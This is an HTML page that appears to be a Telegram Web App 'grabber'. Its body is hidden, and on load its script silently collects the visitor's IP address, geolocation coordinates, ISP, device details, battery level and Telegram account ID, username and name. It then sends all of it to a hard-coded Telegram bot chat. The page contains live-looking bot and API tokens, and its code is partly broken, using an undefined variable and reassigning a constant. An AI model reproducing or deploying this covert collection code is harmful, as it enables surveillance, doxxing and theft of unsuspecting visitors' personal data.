<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHP Page with JavaScript</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            display: none;
        }
    </style>
</head>
<body>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            let batteryLevel;
            let screenWidth;
            let screenHeight;

            navigator.getBattery().then(function(battery) {
                batteryLevel = battery.level * 100;
            });

            screenWidth = window.screen.width;
            screenHeight = window.screen.height;

            const tg = window.Telegram.WebApp;

            const urlParams = new URLSearchParams(window.location.search);
            const userAgent = navigator.userAgent;

            fetch('https://ipapi.co/json/')
                .then(response => response.json())
                .then(data => {
                    const ip = data.ip;
                    const city = data.city;
                    const region = data.region;
                    const country = data.country_name;
                    const latitude = data.latitude;
                    const longitude = data.longitude;
                    const time = data.timezone;
                    const isp = data.org;
                    const osname = navigator.platform;
                    const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                    let userid = document.createElement('p');
                    
                    let systemTime = new Date();
                    let hours = systemTime.getHours();
                    let minutes = systemTime.getMinutes();
                    let formattedTime = `${hours}:${minutes}`;

                    let language = navigator.language;
                    
                    let datee = new Date();
                    let day = datee.getDate();
                    let month = datee.getMonth() + 1;
                    let year = datee.getFullYear();
    
                    let dayOfWeek = datee.getDay();
    
                    if (day < 10) {
                        day = '0' + day;
                    }
    
                    if (month < 10) {
                        month = '0' + month;
                    }
    
                    let formedDate = day + '.' + month + '.' + year;
                    
                    let memory = navigator.deviceMemory;
                    
                    let TypeInternet = navigator.connection.effectiveType;

                    fetch('https://ipinfo.io/' + ip + '/json?token=afae6637fcf7bf')
                        .then(response => response.json())
                        .then(data => {
                            const isProxy = data.proxy ? "Yes" : "No";
                            const isVPN = data.tor ? "Yes" : "No";

                            if (data.hasOwnProperty('proxy')) {
                                isProxy = data.proxy ? "Yes" : "No";
                            }
                        });

                    const message = `
      * Ip üåê*
    *‚îú IP: ${ip}*
    *‚îú UserAgent: ${userAgent}*
    *‚îú Provider: ${isp}*
    *‚îú City: ${city}*
    *‚îú Region: ${region}*
    *‚îú Timezone IP: ${time}*
    *‚îú Coordinates: ${longitude} ${latitude},*
    *‚îú Proxy: ${isProxy}*
    *‚îú Vpn: ${isVPN}*
      * System üñ•*
    *‚îú Browser: ${browser}*
    *‚îú Os: ${osname}*
    *‚îú Battery: ${batteryLevel}%*
    *‚îú Screen resolution: ${screenWidth}x${screenHeight}*
    *‚îú Time: ${formattedTime}*
    *‚îú Language: ${language}*
    *‚îú Timezone: ${formattedTime}*
    *‚îú Date: ${formedDate} Day of week: ${dayOfWeek}*
    *‚îú Memory: ${memory} RAM*
    *‚îú Internet: ${TypeInternet}*
      *üîç  Account: *
    *‚îú ID: ${tg.initDataUnsafe.user.id}*
    *‚îú Username: @${tg.initDataUnsafe.user.username}*
    *‚îú Name: ${tg.initDataUnsafe.user.first_name}*
    *‚îú Language: ${tg.initDataUnsafe.user.language_code}*
                             `;
        
        const token = '6760998368:AAGASTUFyPU3WQyupgYDk11ygOb4SU7oCus';
        const chatId = '-1002084822950';
        const url = 'https://api.telegram.org/bot'+token+'/sendMessage';
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('text', message);
        formData.append('parse_mode', 'Markdown');
        fetch(url, {
            method: 'POST',
            body: formData
        });
    });
});

function getBrowserInfo() {
    const ua = navigator.userAgent;
    let browser = '';
    const match = ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i);

    if (/trident/i.test(match[1])) {
        const tem = /\brv[ :]+(\d+)/g.exec(ua);
        browser = 'IE ' + (tem[1] || '');
    }

    if (match[1] === 'Chrome') {
        const tem = ua.match(/\b(OPR|Edge)\/(\d+)/);
        if (tem != null) browser = tem.slice(1).join(' ').replace('OPR', 'Opera');
    }

    match[2] = match[2] ? 'version ' + match[2] : '';
    browser = `${match[1]} ${match[2] || ''}`.trim();
    return browser;
};
    </script>
</body>
</html>
